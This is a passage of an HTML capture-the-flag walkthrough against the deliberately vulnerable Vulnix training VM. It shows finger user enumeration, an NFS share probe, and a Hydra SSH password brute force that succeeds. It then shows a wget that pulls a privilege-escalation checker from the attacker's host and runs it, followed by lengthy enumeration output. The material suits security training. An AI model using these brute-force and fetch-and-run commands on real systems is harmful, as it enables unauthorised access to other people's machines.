+[gandosha@GandoPC 192.168.43.4]$ finger -l backup@192.168.43.4
+[192.168.43.4]
+Login: backup         			Name: backup
+Directory: /var/backups             	Shell: /bin/sh
+Never logged in.
+No mail.
+No Plan.
+[gandosha@GandoPC 192.168.43.4]$ finger -l bin@192.168.43.4
+[192.168.43.4]
+Login: bin            			Name: bin
+Directory: /bin                     	Shell: /bin/sh
+Never logged in.
+No mail.
+No Plan.
+[gandosha@GandoPC 192.168.43.4]$ finger -l daemon@192.168.43.4
+[192.168.43.4]
+Login: daemon         			Name: daemon
+Directory: /usr/sbin                	Shell: /bin/sh
+Never logged in.
+No mail.
+No Plan.
+[gandosha@GandoPC 192.168.43.4]$ finger -l games@192.168.43.4
+[192.168.43.4]
+Login: games          			Name: games
+Directory: /usr/games               	Shell: /bin/sh
+Never logged in.
+No mail.
+No Plan.
+[gandosha@GandoPC 192.168.43.4]$ finger -l gnats@192.168.43.4
+[192.168.43.4]
+Login: gnats          			Name: Gnats Bug-Reporting System (admin)
+Directory: /var/lib/gnats           	Shell: /bin/sh
+Never logged in.
+No mail.
+No Plan.
+[gandosha@GandoPC 192.168.43.4]$ finger -l irc@192.168.43.4
+[192.168.43.4]
+Login: irc            			Name: ircd
+Directory: /var/run/ircd            	Shell: /bin/sh
+Never logged in.
+No mail.
+No Plan.
+[gandosha@GandoPC 192.168.43.4]$ finger -l list@192.168.43.4
+[192.168.43.4]
+Login: list           			Name: Mailing List Manager
+Directory: /var/list                	Shell: /bin/sh
+Never logged in.
+No mail.
+No Plan.
+[gandosha@GandoPC 192.168.43.4]$ finger -l libuuid@192.168.43.4
+[192.168.43.4]
+Login: libuuid        			Name: 
+Directory: /var/lib/libuuid         	Shell: /bin/sh
+Never logged in.
+No mail.
+No Plan.
+[gandosha@GandoPC 192.168.43.4]$ finger -l lp@192.168.43.4
+[192.168.43.4]
+Login: lp             			Name: lp
+Directory: /var/spool/lpd           	Shell: /bin/sh
+Never logged in.
+No mail.
+No Plan.
+[gandosha@GandoPC 192.168.43.4]$ finger -l mail@192.168.43.4
+[192.168.43.4]
+Login: mail           			Name: mail
+Directory: /var/mail                	Shell: /bin/sh
+Never logged in.
+No mail.
+No Plan.
+
+Login: dovecot        			Name: Dovecot mail server
+Directory: /usr/lib/dovecot         	Shell: /bin/false
+Never logged in.
+No mail.
+No Plan.
+[gandosha@GandoPC 192.168.43.4]$ finger -l man@192.168.43.4
+[192.168.43.4]
+Login: man            			Name: man
+Directory: /var/cache/man           	Shell: /bin/sh
+Never logged in.
+No mail.
+No Plan.
+[gandosha@GandoPC 192.168.43.4]$ finger -l messagebus@192.168.43.4
+[192.168.43.4]
+Login: messagebus     			Name: 
+Directory: /var/run/dbus            	Shell: /bin/false
+Never logged in.
+No mail.
+No Plan.
+[gandosha@GandoPC 192.168.43.4]$ finger -l news@192.168.43.4
+[192.168.43.4]
+Login: news           			Name: news
+Directory: /var/spool/news          	Shell: /bin/sh
+Never logged in.
+No mail.
+No Plan.
+[gandosha@GandoPC 192.168.43.4]$ finger -l nobody@192.168.43.4
+[192.168.43.4]
+Login: nobody         			Name: nobody
+Directory: /nonexistent             	Shell: /bin/sh
+Never logged in.
+No mail.
+No Plan.
+[gandosha@GandoPC 192.168.43.4]$ finger -l postmaster@192.168.43.4
+[192.168.43.4]
+finger: postmaster: no such user.
+[gandosha@GandoPC 192.168.43.4]$ finger -l proxy@192.168.43.4
+[192.168.43.4]
+Login: proxy          			Name: proxy
+Directory: /bin                     	Shell: /bin/sh
+Never logged in.
+No mail.
+No Plan.
+[gandosha@GandoPC 192.168.43.4]$ finger -l sshd@192.168.43.4
+[192.168.43.4]
+Login: sshd           			Name: 
+Directory: /var/run/sshd            	Shell: /usr/sbin/nologin
+Never logged in.
+No mail.
+No Plan.
+[gandosha@GandoPC 192.168.43.4]$ finger -l sync@192.168.43.4
+[192.168.43.4]
+Login: sync           			Name: sync
+Directory: /bin                     	Shell: /bin/sync
+Never logged in.
+No mail.
+No Plan.
+[gandosha@GandoPC 192.168.43.4]$ finger -l sys@192.168.43.4
+[192.168.43.4]
+Login: sys            			Name: sys
+Directory: /dev                     	Shell: /bin/sh
+Never logged in.
+No mail.
+No Plan.
+[gandosha@GandoPC 192.168.43.4]$ finger -l syslog@192.168.43.4
+[192.168.43.4]
+Login: syslog         			Name: 
+Directory: /home/syslog             	Shell: /bin/false
+Never logged in.
+No mail.
+No Plan.
+[gandosha@GandoPC 192.168.43.4]$ finger -l user@192.168.43.4
+[192.168.43.4]
+Login: user           			Name: user
+Directory: /home/user               	Shell: /bin/bash
+Never logged in.
+No mail.
+No Plan.
+
+Login: dovenull       			Name: Dovecot login user
+Directory: /nonexistent             	Shell: /bin/false
+Never logged in.
+No mail.
+No Plan.
+[gandosha@GandoPC 192.168.43.4]$ finger -l uucp@192.168.43.4
+[192.168.43.4]
+Login: uucp           			Name: uucp
+Directory: /var/spool/uucp          	Shell: /bin/sh
+Never logged in.
+No mail.
+No Plan.
+[gandosha@GandoPC 192.168.43.4]$ finger -l www-data@192.168.43.4
+[192.168.43.4]
+Login: www-data       			Name: www-data
+Directory: /var/www                 	Shell: /bin/sh
+Never logged in.
+No mail.
+No Plan.
+</pre>
+<p><font size="3.5" color="black">The user "user" may be interesting because it shows that it has a /home directory.</font></p>
+<hr>
+<br>
+<br>
+<p><h3>Port 111 check:</h3></p>
+<hr>
+<p><font size="3.5" color="black">Nmap's output shows that on this port a NFS is mounted.</font></p>
+<p><font size="3.5" color="black">I used showmount to dig in those shares:</font></p>
+<pre style="background-color:black;color:white;">
+[gandosha@GandoPC 192.168.43.4]$ showmount -e 192.168.43.4
+Export list for 192.168.43.4:
+/home/vulnix *
+</pre>
+
+<p><font size="3.5" color="black">An interesting share is discovered.</font></p>
+<p><font size="3.5" color="black">Finger output did not help me a lot:</font></p>
+<pre style="background-color:black;color:white;">
+[gandosha@GandoPC mnt]$ finger -l vulnix@192.168.43.4
+[192.168.43.4]
+Login: vulnix         			Name: 
+Directory: /home/vulnix             	Shell: /bin/bash
+Never logged in.
+No mail.
+No Plan.
+</pre>
+<p><font size="3.5" color="black">I mounted this share on my local host to see what's in there:</font></p>
+<pre style="background-color:black;color:white;">
+[GandoPC ~]# mkdir -p /mnt/home/vulnix
+[GandoPC ~]# mount 192.168.43.4:/home/vulnix /mnt/home/vulnix
+[GandoPC ~]# cd /mnt/home/vulnix
+bash: cd: /mnt/home/vulnix: Permission denied
+</pre>
+<p><font size="3.5" color="black">Root squashing is enabled, i cant access it.</font></p>
+<p><font size="3.5" color="black">I had no choice except for brute forcing ssh service using "user" and "vulnix" users.</font></p>
+</pre>
+<hr>
+<br>
+<br>
+<p><h3>Gaining SSH access with "user" user:</h3></p>
+<hr>
+<p><font size="3.5" color="black">Brute force attack on "user":</font></p>
+<pre style="background-color:black;color:white;">
+[gandosha@GandoPC 192.168.43.4]$ sudo hydra -l user -P /home/gandosha/Desktop/SecLists/Passwords/Leaked-Databases/rockyou.txt 192.168.43.4 ssh -t 4
+[sudo] password for gandosha: 
+Hydra v8.6 (c) 2017 by van Hauser/THC - Please do not use in military or secret service organizations, or for illegal purposes.
+
+Hydra (http://www.thc.org/thc-hydra) starting at 2018-10-16 19:17:37
+[DATA] max 4 tasks per 1 server, overall 4 tasks, 14344398 login tries (l:1/p:14344398), ~3586100 tries per task
+[DATA] attacking ssh://192.168.43.4:22/
+[STATUS] 64.00 tries/min, 64 tries in 00:01h, 14344334 to do in 3735:31h, 4 active
+[STATUS] 61.33 tries/min, 184 tries in 00:03h, 14344214 to do in 3897:54h, 4 active
+[STATUS] 60.29 tries/min, 422 tries in 00:07h, 14343976 to do in 3965:34h, 4 active
+[22][ssh] host: 192.168.43.4   login: user   password: letmein
+1 of 1 target successfully completed, 1 valid password found
+Hydra (http://www.thc.org/thc-hydra) finished at 2018-10-16 19:26:15
+</pre>
+<p><font size="3.5" color="black">I connected to "user" via ssh and started to enumerate its permissions using linuxprivchecker.py:</font></p>
+<pre style="background-color:black;color:white;">
+[gandosha@GandoPC 192.168.43.4]$ ssh user@192.168.43.4
+user@192.168.43.4's password: 
+Welcome to Ubuntu 12.04.1 LTS (GNU/Linux 3.2.0-29-generic-pae i686)
+
+ * Documentation:  https://help.ubuntu.com/
+
+  System information as of Tue Oct 16 17:04:35 BST 2018
+
+  System load:  0.03             Processes:           87
+  Usage of /:   94.3% of 773MB   Users logged in:     0
+  Memory usage: 12%              IP address for eth0: 192.168.43.4
+  Swap usage:   0%
+
+  => / is using 94.3% of 773MB
+
+  Graph this data and manage this system at https://landscape.canonical.com/
+
+Last login: Tue Oct 16 16:45:42 2018 from 192.168.43.3
+user@vulnix:~$ cd /tmp;ls
+user@vulnix:/tmp$ wget 192.168.43.3//Tools/linuxprivchecker/linuxprivchecker.py
+--2018-10-16 17:05:34--  http://192.168.43.3//Tools/linuxprivchecker/linuxprivchecker.py
+Connecting to 192.168.43.3:80... connected.
+HTTP request sent, awaiting response... 200 OK
+Length: 25304 (25K)
+Saving to: `linuxprivchecker.py'
+
+100%[====================================================================================================================================================>] 25,304      --.-K/s   in 0s      
+
+2018-10-16 17:05:34 (703 MB/s) - `linuxprivchecker.py' saved [25304/25304]
+
+user@vulnix:/tmp$ chmod +x linuxprivchecker.py 
+user@vulnix:/tmp$ python ./linuxprivchecker.py 
+=================================================================================================
+LINUX PRIVILEGE ESCALATION CHECKER
+=================================================================================================
+
+[*] GETTING BASIC SYSTEM INFO...
+
+[+] Kernel
+    Linux version 3.2.0-29-generic-pae (buildd@roseapple) (gcc version 4.6.3 (Ubuntu/Linaro 4.6.3-1ubuntu5) ) #46-Ubuntu SMP Fri Jul 27 17:25:43 UTC 2012
+
+[+] Hostname
+    vulnix
+
+[+] Operating System
+    Ubuntu 12.04.1 LTS \n \l
+    db    db db    db db      d8b   db d888888b db    db
+    88    88 88    88 88      888o  88   `88'   `8b  d8'
+    Y8    8P 88    88 88      88V8o 88    88     `8bd8'
+    `8b  d8' 88    88 88      88 V8o88    88     .dPYb.
+    `8bd8'  88b  d88 88booo. 88  V888   .88.   .8P  Y8.
+    YP    ~Y8888P' Y88888P VP   V8P Y888888P YP    YP
+    Release 1.0
+    This is a deliberately vulnerable image. Do not place within a live environment.
+    For training purposes only.
+    www.rebootuser.com
+
+[*] GETTING NETWORKING INFO...
+
+[+] Interfaces
+    eth0      Link encap:Ethernet  HWaddr 08:00:27:af:e3:88
+    inet addr:192.168.43.4  Bcast:192.168.43.255  Mask:255.255.255.0
+    inet6 addr: fe80::a00:27ff:feaf:e388/64 Scope:Link
+    UP BROADCAST RUNNING MULTICAST  MTU:1500  Metric:1
+    RX packets:2861221 errors:0 dropped:0 overruns:0 frame:0
+    TX packets:2446285 errors:0 dropped:0 overruns:0 carrier:0
+    collisions:0 txqueuelen:1000
+    RX bytes:346478250 (346.4 MB)  TX bytes:419583453 (419.5 MB)
+    lo        Link encap:Local Loopback
+    inet addr:127.0.0.1  Mask:255.0.0.0
+    inet6 addr: ::1/128 Scope:Host
+    UP LOOPBACK RUNNING  MTU:16436  Metric:1
+    RX packets:636 errors:0 dropped:0 overruns:0 frame:0
+    TX packets:636 errors:0 dropped:0 overruns:0 carrier:0
+    collisions:0 txqueuelen:0
+    RX bytes:53300 (53.3 KB)  TX bytes:53300 (53.3 KB)
+
+[+] Netstat
+    Active Internet connections (servers and established)
+    Proto Recv-Q Send-Q Local Address           Foreign Address         State       PID/Program name
+    tcp        0      0 0.0.0.0:41645           0.0.0.0:*               LISTEN      -
+    tcp        0      0 0.0.0.0:60141           0.0.0.0:*               LISTEN      -
+    tcp        0      0 0.0.0.0:36654           0.0.0.0:*               LISTEN      -
+    tcp        0      0 0.0.0.0:110             0.0.0.0:*               LISTEN      -
+    tcp        0      0 0.0.0.0:143             0.0.0.0:*               LISTEN      -
+    tcp        0      0 0.0.0.0:79              0.0.0.0:*               LISTEN      -
+    tcp        0      0 0.0.0.0:111             0.0.0.0:*               LISTEN      -
+    tcp        0      0 0.0.0.0:43602           0.0.0.0:*               LISTEN      -
+    tcp        0      0 0.0.0.0:22              0.0.0.0:*               LISTEN      -
+    tcp        0      0 0.0.0.0:25              0.0.0.0:*               LISTEN      -
+    tcp        0      0 0.0.0.0:512             0.0.0.0:*               LISTEN      -
+    tcp        0      0 0.0.0.0:2049            0.0.0.0:*               LISTEN      -
+    tcp        0      0 0.0.0.0:993             0.0.0.0:*               LISTEN      -
+    tcp        0      0 0.0.0.0:513             0.0.0.0:*               LISTEN      -
+    tcp        0      0 0.0.0.0:514             0.0.0.0:*               LISTEN      -
+    tcp        0      0 0.0.0.0:995             0.0.0.0:*               LISTEN      -
+    tcp        0      0 0.0.0.0:60680           0.0.0.0:*               LISTEN      -
+    tcp        0      0 192.168.43.4:758        192.168.43.3:41635      ESTABLISHED -
+    tcp        0      0 192.168.43.4:2049       192.168.43.3:835        ESTABLISHED -
+    tcp        0      0 192.168.43.4:22         192.168.43.3:50034      ESTABLISHED -
+    tcp6       0      0 :::60109                :::*                    LISTEN      -
+    tcp6       0      0 :::110                  :::*                    LISTEN      -
+    tcp6       0      0 :::143                  :::*                    LISTEN      -
+    tcp6       0      0 :::111                  :::*                    LISTEN      -
+    tcp6       0      0 :::60309                :::*                    LISTEN      -
+    tcp6       0      0 :::22                   :::*                    LISTEN      -
+    tcp6       0      0 :::54231                :::*                    LISTEN      -
+    tcp6       0      0 :::59223                :::*                    LISTEN      -
+    tcp6       0      0 :::25                   :::*                    LISTEN      -
+    tcp6       0      0 :::2049                 :::*                    LISTEN      -
+    tcp6       0      0 :::993                  :::*                    LISTEN      -
+    tcp6       0      0 :::995                  :::*                    LISTEN      -
+    tcp6       0      0 :::52518                :::*                    LISTEN      -
+    udp        0      0 0.0.0.0:54966           0.0.0.0:*                           -
+    udp        0      0 127.0.0.1:985           0.0.0.0:*                           -
+    udp        0      0 0.0.0.0:2049            0.0.0.0:*                           -
+    udp        0      0 0.0.0.0:46599           0.0.0.0:*                           -
+    udp        0      0 0.0.0.0:800             0.0.0.0:*                           -
+    udp        0      0 0.0.0.0:50218           0.0.0.0:*                           -
+    udp        0      0 0.0.0.0:68              0.0.0.0:*                           -
+    udp        0      0 0.0.0.0:51815           0.0.0.0:*                           -
+    udp        0      0 0.0.0.0:111             0.0.0.0:*                           -
+    udp        0      0 0.0.0.0:47493           0.0.0.0:*                           -
+    udp6       0      0 :::40843                :::*                                -
+    udp6       0      0 :::34491                :::*                                -
+    udp6       0      0 :::2049                 :::*                                -
+    udp6       0      0 :::800                  :::*                                -
+    udp6       0      0 :::38998                :::*                                -
+    udp6       0      0 :::53083                :::*                                -
+    udp6       0      0 :::111                  :::*                                -
+    udp6       0      0 :::50036                :::*                                -
+
+[+] Route
+    Kernel IP routing table
+    Destination     Gateway         Genmask         Flags Metric Ref    Use Iface
+    192.168.43.0    *               255.255.255.0   U     0      0        0 eth0
+
+[*] GETTING FILESYSTEM INFO...
+
+[+] Mount results
+    /dev/mapper/vulnix-root on / type ext4 (rw,errors=remount-ro)
+    proc on /proc type proc (rw,noexec,nosuid,nodev)
+    sysfs on /sys type sysfs (rw,noexec,nosuid,nodev)
+    none on /sys/fs/fuse/connections type fusectl (rw)
+    none on /sys/kernel/debug type debugfs (rw)
+    none on /sys/kernel/security type securityfs (rw)
+    udev on /dev type devtmpfs (rw,mode=0755)
+    devpts on /dev/pts type devpts (rw,noexec,nosuid,gid=5,mode=0620)
+    tmpfs on /run type tmpfs (rw,noexec,nosuid,size=10%,mode=0755)
+    none on /run/lock type tmpfs (rw,noexec,nosuid,nodev,size=5242880)
+    none on /run/shm type tmpfs (rw,nosuid,nodev)
+    /dev/sda1 on /boot type ext2 (rw)
+    rpc_pipefs on /run/rpc_pipefs type rpc_pipefs (rw)
+    nfsd on /proc/fs/nfsd type nfsd (rw)
+
+[+] fstab entries
+    # /etc/fstab: static file system information.
+    #
+    # Use 'blkid' to print the universally unique identifier for a
+    # device; this may be used with UUID= as a more robust way to name devices
+    # that works even if disks are added and removed. See fstab(5).
+    #
+    # <file system> <mount point>   <type>  <options>       <dump>  <pass>
+    proc            /proc           proc    nodev,noexec,nosuid 0       0
+    /dev/mapper/vulnix-root /               ext4    errors=remount-ro 0       1
+    # /boot was on /dev/sda1 during installation
+    UUID=14f8e0aa-04a1-4976-a52b-73ab33ba1f1f /boot           ext2    defaults        0       2
+    /dev/mapper/vulnix-swap_1 none            swap    sw              0       0
+    /dev/fd0        /media/floppy0  auto    rw,user,noauto,exec,utf8 0       0
+
+[+] Scheduled cron jobs
+    -rw-r--r-- 1 root root  722 Jun 19  2012 /etc/crontab
+    /etc/cron.d:
+    total 12
+    drwxr-xr-x  2 root root 4096 Sep  2  2012 .
+    drwxr-xr-x 91 root root 4096 Oct 16 11:51 ..
+    -rw-r--r--  1 root root  102 Jun 19  2012 .placeholder
+    /etc/cron.daily:
+    total 72
+    drwxr-xr-x  2 root root  4096 Sep  2  2012 .
+    drwxr-xr-x 91 root root  4096 Oct 16 11:51 ..
+    -rwxr-xr-x  1 root root   219 Apr 10  2012 apport
+    -rwxr-xr-x  1 root root 15399 Jun 15  2012 apt
+    -rwxr-xr-x  1 root root   314 Mar 30  2012 aptitude
+    -rwxr-xr-x  1 root root   502 Mar 31  2012 bsdmainutils
+    -rwxr-xr-x  1 root root   256 Apr 13  2012 dpkg
+    -rwxr-xr-x  1 root root   372 Oct  4  2011 logrotate
+    -rwxr-xr-x  1 root root  1365 Mar 31  2012 man-db
+    -rwxr-xr-x  1 root root   606 Aug 17  2011 mlocate
+    -rwxr-xr-x  1 root root   249 Apr  9  2012 passwd
+    -rw-r--r--  1 root root   102 Jun 19  2012 .placeholder
+    -rwxr-xr-x  1 root root  2417 Jul  1  2011 popularity-contest
+    -rwxr-xr-x  1 root root  2947 Jun 19  2012 standard
+    -rwxr-xr-x  1 root root   214 Aug  9  2012 update-notifier-common
+    /etc/cron.hourly:
+    total 12
+    drwxr-xr-x  2 root root 4096 Sep  2  2012 .
+    drwxr-xr-x 91 root root 4096 Oct 16 11:51 ..
+    -rw-r--r--  1 root root  102 Jun 19  2012 .placeholder
+    /etc/cron.monthly:
+    total 12
+    drwxr-xr-x  2 root root 4096 Sep  2  2012 .
+    drwxr-xr-x 91 root root 4096 Oct 16 11:51 ..
+    -rw-r--r--  1 root root  102 Jun 19  2012 .placeholder
+    /etc/cron.weekly:
+    total 20
+    drwxr-xr-x  2 root root 4096 Sep  2  2012 .
+    drwxr-xr-x 91 root root 4096 Oct 16 11:51 ..
+    -rwxr-xr-x  1 root root  730 Dec 31  2011 apt-xapian-index
+    -rwxr-xr-x  1 root root  907 Mar 31  2012 man-db
+    -rw-r--r--  1 root root  102 Jun 19  2012 .placeholder
+
+[+] Writable cron dirs
+
+
+[*] ENUMERATING USER AND ENVIRONMENTAL INFO...
+
+[+] Logged in User Activity
+    17:05:51 up  5:14,  1 user,  load average: 0.01, 0.12, 2.43
+    USER     TTY      FROM              LOGIN@   IDLE   JCPU   PCPU WHAT
+    user     pts/0    192.168.43.3     17:04    0.00s  0.22s  0.00s w
+
+[+] Super Users Found:
+    root
+
+[+] Environment
+    LESSOPEN=| /usr/bin/lesspipe %s
+    MAIL=/var/mail/user
+    SSH_CLIENT=192.168.43.3 50034 22
+    USER=user
+    LANGUAGE=en_GB:en
+    SHLVL=1
+    HOME=/home/user
+    OLDPWD=/home/user
+    SSH_TTY=/dev/pts/0
+    LOGNAME=user
+    _=/usr/bin/python
+    TERM=xterm-256color
+    PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:/usr/games
+    LANG=en_GB.UTF-8
+    SHELL=/bin/bash
+    LESSCLOSE=/usr/bin/lesspipe %s %s
+    PWD=/tmp
+    SSH_CONNECTION=192.168.43.3 50034 192.168.43.4 22
+
+[+] Root and current user history (depends on privs)
+    -rw------- 1 user user 5 Oct 16 17:04 /home/user/.bash_history
+
+[+] Sudoers (privileged)
+
+[+] All users
+    root:x:0:0:root:/root:/bin/bash
+    daemon:x:1:1:daemon:/usr/sbin:/bin/sh
+    bin:x:2:2:bin:/bin:/bin/sh
+    sys:x:3:3:sys:/dev:/bin/sh
+    sync:x:4:65534:sync:/bin:/bin/sync
+    games:x:5:60:games:/usr/games:/bin/sh
+    man:x:6:12:man:/var/cache/man:/bin/sh
+    lp:x:7:7:lp:/var/spool/lpd:/bin/sh
+    mail:x:8:8:mail:/var/mail:/bin/sh
+    news:x:9:9:news:/var/spool/news:/bin/sh
+    uucp:x:10:10:uucp:/var/spool/uucp:/bin/sh
+    proxy:x:13:13:proxy:/bin:/bin/sh
+    www-data:x:33:33:www-data:/var/www:/bin/sh
+    backup:x:34:34:backup:/var/backups:/bin/sh
+    list:x:38:38:Mailing List Manager:/var/list:/bin/sh
+    irc:x:39:39:ircd:/var/run/ircd:/bin/sh
+    gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/bin/sh
+    nobody:x:65534:65534:nobody:/nonexistent:/bin/sh
+    libuuid:x:100:101::/var/lib/libuuid:/bin/sh
+    syslog:x:101:103::/home/syslog:/bin/false
+    messagebus:x:102:105::/var/run/dbus:/bin/false
+    whoopsie:x:103:106::/nonexistent:/bin/false
+    postfix:x:104:110::/var/spool/postfix:/bin/false
+    dovecot:x:105:112:Dovecot mail server,,,:/usr/lib/dovecot:/bin/false
+    dovenull:x:106:65534:Dovecot login user,,,:/nonexistent:/bin/false
+    landscape:x:107:113::/var/lib/landscape:/bin/false
+    sshd:x:108:65534::/var/run/sshd:/usr/sbin/nologin
+    user:x:1000:1000:user,,,:/home/user:/bin/bash
+    vulnix:x:2008:2008::/home/vulnix:/bin/bash
+    statd:x:109:65534::/var/lib/nfs:/bin/false
+
+[+] Current User
+    user
+
+[+] Current User ID
+    uid=1000(user) gid=1000(user) groups=1000(user),100(users)
+
+[*] ENUMERATING FILE AND DIRECTORY PERMISSIONS/CONTENTS...
+
+[+] World Writeable Directories for User/Group 'Root'
+    drwxrwxrwt 2 root root 40 Oct 16 11:51 /run/shm
+    drwxrwxrwt 4 root root 80 Oct 16 11:51 /run/lock
+    drwxrwxrwt 2 root root 4096 Aug  4  2012 /var/tmp
+    drwxrwsrwt 2 root whoopsie 4096 Sep  2  2012 /var/crash
+    drwxrwxrwt 2 root root 4096 Oct 16 17:05 /tmp
+
+[+] World Writeable Directories for Users other than Root
+
+[+] World Writable Files
+
+[+] Checking if root's home folder is accessible
+
+[+] SUID/SGID Files and Directories
+    drwxr-s--- 2 root dip 4096 Sep  2  2012 /etc/chatscripts
+    drwxr-s--- 2 root dip 4096 Sep  2  2012 /etc/ppp/peers
+    -rwxr-sr-x 1 root shadow 30364 Feb  9  2012 /sbin/unix_chkpwd
+    -rwsr-xr-x 1 root root 96904 Apr  9  2012 /sbin/mount.nfs
+    drwxrwsr-x 2 root staff 4096 Aug  4  2012 /var/local
+    drwxr-sr-x 33 man root 4096 Sep  2  2012 /var/cache/man
+    drwxr-sr-x 5 man root 4096 Sep  2  2012 /var/cache/man/ja
+    drwxr-sr-x 2 man root 4096 Sep  2  2012 /var/cache/man/ja/cat1
+    drwxr-sr-x 2 man root 4096 Sep  2  2012 /var/cache/man/ja/cat8
+    drwxr-sr-x 2 man root 4096 Sep  2  2012 /var/cache/man/ja/cat5
+    drwxr-sr-x 3 man root 4096 Sep  2  2012 /var/cache/man/gl
+    drwxr-sr-x 2 man root 4096 Sep  2  2012 /var/cache/man/gl/cat8
+    drwxr-sr-x 6 man root 4096 Sep  2  2012 /var/cache/man/cs
+    drwxr-sr-x 2 man root 4096 Sep  2  2012 /var/cache/man/cs/cat1
+    drwxr-sr-x 2 man root 4096 Sep  2  2012 /var/cache/man/cs/cat8
+    drwxr-sr-x 2 man root 4096 Sep  2  2012 /var/cache/man/cs/cat7
+    drwxr-sr-x 2 man root 4096 Sep  2  2012 /var/cache/man/cs/cat5
+    drwxr-sr-x 2 man root 4096 Sep  2  2012 /var/cache/man/cat1
+    drwxr-sr-x 4 man root 4096 Sep  2  2012 /var/cache/man/fi
+    drwxr-sr-x 2 man root 4096 Sep  2  2012 /var/cache/man/fi/cat1
+    drwxr-sr-x 2 man root 4096 Sep  2  2012 /var/cache/man/fi/cat8
+    drwxr-sr-x 5 man root 4096 Sep  2  2012 /var/cache/man/hu
+    drwxr-sr-x 2 man root 4096 Sep  2  2012 /var/cache/man/hu/cat1
+    drwxr-sr-x 2 man root 4096 Sep  2  2012 /var/cache/man/hu/cat8
+    drwxr-sr-x 2 man root 4096 Sep  2  2012 /var/cache/man/hu/cat5
+    drwxr-sr-x 2 man root 4096 Sep  2  2012 /var/cache/man/cat8
+    drwxr-sr-x 5 man root 4096 Sep  2  2012 /var/cache/man/ko
+    drwxr-sr-x 2 man root 4096 Sep  2  2012 /var/cache/man/ko/cat1
+    drwxr-sr-x 2 man root 4096 Sep  2  2012 /var/cache/man/ko/cat8
+    drwxr-sr-x 2 man root 4096 Sep  2  2012 /var/cache/man/ko/cat5
+    drwxr-sr-x 2 man root 4096 Sep  2  2012 /var/cache/man/cat7
+    drwxr-sr-x 2 man root 4096 Sep  2  2012 /var/cache/man/cat5
+    drwxr-sr-x 5 man root 4096 Sep  2  2012 /var/cache/man/it
+    drwxr-sr-x 2 man root 4096 Sep  2  2012 /var/cache/man/it/cat1
+    drwxr-sr-x 2 man root 4096 Sep  2  2012 /var/cache/man/it/cat8
+    drwxr-sr-x 2 man root 4096 Sep  2  2012 /var/cache/man/it/cat5
+    drwxr-sr-x 2 man root 4096 Sep  2  2012 /var/cache/man/cat4
+    drwxr-sr-x 5 man root 4096 Sep  2  2012 /var/cache/man/zh_CN
+    drwxr-sr-x 2 man root 4096 Sep  2  2012 /var/cache/man/zh_CN/cat1
+    drwxr-sr-x 2 man root 4096 Sep  2  2012 /var/cache/man/zh_CN/cat8
+    drwxr-sr-x 2 man root 4096 Sep  2  2012 /var/cache/man/zh_CN/cat5
+    drwxr-sr-x 5 man root 4096 Sep  2  2012 /var/cache/man/ru
+    drwxr-sr-x 2 man root 4096 Sep  2  2012 /var/cache/man/ru/cat1
+    drwxr-sr-x 2 man root 4096 Sep  2  2012 /var/cache/man/ru/cat8
+    drwxr-sr-x 2 man root 4096 Sep  2  2012 /var/cache/man/ru/cat5
+    drwxr-sr-x 2 man root 4096 Sep  2  2012 /var/cache/man/cat2
+    drwxr-sr-x 5 man root 4096 Sep  2  2012 /var/cache/man/pl
+    drwxr-sr-x 2 man root 4096 Sep  2  2012 /var/cache/man/pl/cat1
+    drwxr-sr-x 2 man root 4096 Sep  2  2012 /var/cache/man/pl/cat8
+    drwxr-sr-x 2 man root 4096 Sep  2  2012 /var/cache/man/pl/cat5
+    drwxr-sr-x 5 man root 4096 Sep  2  2012 /var/cache/man/fr
+    drwxr-sr-x 2 man root 4096 Sep  2  2012 /var/cache/man/fr/cat1
+    drwxr-sr-x 2 man root 4096 Sep  2  2012 /var/cache/man/fr/cat8
+    drwxr-sr-x 2 man root 4096 Sep  2  2012 /var/cache/man/fr/cat5
+    drwxr-sr-x 5 man root 4096 Sep  2  2012 /var/cache/man/sv
+    drwxr-sr-x 2 man root 4096 Sep  2  2012 /var/cache/man/sv/cat1
+    drwxr-sr-x 2 man root 4096 Sep  2  2012 /var/cache/man/sv/cat8
+    drwxr-sr-x 2 man root 4096 Sep  2  2012 /var/cache/man/sv/cat5
+    drwxr-sr-x 4 man root 4096 Sep  2  2012 /var/cache/man/fr.UTF-8
+    drwxr-sr-x 2 man root 4096 Sep  2  2012 /var/cache/man/fr.UTF-8/cat8
+    drwxr-sr-x 2 man root 4096 Sep  2  2012 /var/cache/man/fr.UTF-8/cat7
+    drwxr-sr-x 5 man root 4096 Sep  2  2012 /var/cache/man/es
+    drwxr-sr-x 2 man root 4096 Sep  2  2012 /var/cache/man/es/cat1
+    drwxr-sr-x 2 man root 4096 Sep  2  2012 /var/cache/man/es/cat8
+    drwxr-sr-x 2 man root 4096 Sep  2  2012 /var/cache/man/es/cat5
+    drwxr-sr-x 2 man root 4096 Sep  2  2012 /var/cache/man/cat3
+    drwxr-sr-x 6 man root 4096 Sep  2  2012 /var/cache/man/de
+    drwxr-sr-x 2 man root 4096 Sep  2  2012 /var/cache/man/de/cat1
+    drwxr-sr-x 2 man root 4096 Sep  2  2012 /var/cache/man/de/cat8
+    drwxr-sr-x 2 man root 4096 Sep  2  2012 /var/cache/man/de/cat5
+    drwxr-sr-x 2 man root 4096 Sep  2  2012 /var/cache/man/de/cat3
+    drwxr-sr-x 5 man root 4096 Sep  2  2012 /var/cache/man/pt_BR
+    drwxr-sr-x 2 man root 4096 Sep  2  2012 /var/cache/man/pt_BR/cat1
+    drwxr-sr-x 2 man root 4096 Sep  2  2012 /var/cache/man/pt_BR/cat8
+    drwxr-sr-x 2 man root 4096 Sep  2  2012 /var/cache/man/pt_BR/cat5
+    drwxr-sr-x 4 man root 4096 Sep  2  2012 /var/cache/man/sl
+    drwxr-sr-x 2 man root 4096 Sep  2  2012 /var/cache/man/sl/cat1
+    drwxr-sr-x 2 man root 4096 Sep  2  2012 /var/cache/man/sl/cat8
+    drwxr-sr-x 5 man root 4096 Sep  2  2012 /var/cache/man/zh_TW
+    drwxr-sr-x 2 man root 4096 Sep  2  2012 /var/cache/man/zh_TW/cat1
+    drwxr-sr-x 2 man root 4096 Sep  2  2012 /var/cache/man/zh_TW/cat8
+    drwxr-sr-x 2 man root 4096 Sep  2  2012 /var/cache/man/zh_TW/cat5
+    drwxr-sr-x 5 man root 4096 Sep  2  2012 /var/cache/man/nl
+    drwxr-sr-x 2 man root 4096 Sep  2  2012 /var/cache/man/nl/cat1
